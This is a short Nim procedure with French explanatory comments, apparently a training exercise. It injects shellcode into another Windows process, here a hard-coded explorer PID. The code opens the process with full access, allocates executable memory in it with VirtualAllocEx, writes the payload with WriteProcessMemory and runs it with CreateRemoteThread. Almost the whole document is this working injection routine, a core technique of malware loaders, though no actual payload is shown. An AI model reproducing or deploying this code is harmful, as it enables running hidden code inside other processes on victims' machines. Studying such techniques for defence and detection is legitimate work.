# la procédure reçoit le shell code sous la forme de tableau de bytes
proc injectShellcode[I, T](shellcode: array[I, T]): void =

    # Choix du process ID (PID) où injecter le shellcode
    # ici il est fixe. Dans cet exemple il correspond à un explorer
    # Doit être modifié manuellement lors de chaque redémarrage de l'explorer
    # Type: DWORD (typiquement un alias pour un entier non signé 32 bits sur Windows).

    let processId: DWORD = 6412
    
    # OpenProcess est une fonction de l’API Windows qui ouvre un pseudonym d’accès (handle) sur un processus existant, 
    # afin que le programme puisse interagir avec ce processus.
    # le handle sur le process permet d'interagir avec celui-ci
    # Un handle est une référence fournie par le système d’exploitation pour accéder à une ressource systeme 
    # C’est une sorte d’alias ou pointeur géré par le système, pas une adresse mémoire directe vers l’objet.

    let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId)
    echo fmt"Got a handle on process: {pHandle}"
    defer: CloseHandle(pHandle) # defer fait en sorte que le handle soit fermé automatiquement lorsqu'il n'est plus utile
    

    # virtualAllocEx alloue de la mémoire dans l’espace d’adressage d’un autre processus (processus cible).
    # différence avec l'ex 1 (virtualAlloc)
    let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)

    # Ecrit le payload dans le process à distance
    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
    echo fmt"WriteProcessMemory: {bool(wSuccess)}. Bytes written: {bytesWritten}"

    # Create our remote thread to execute!
    let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
    defer: CloseHandle(tHandle)
    echo fmt"Started shellcode in thread: {tHandle}"

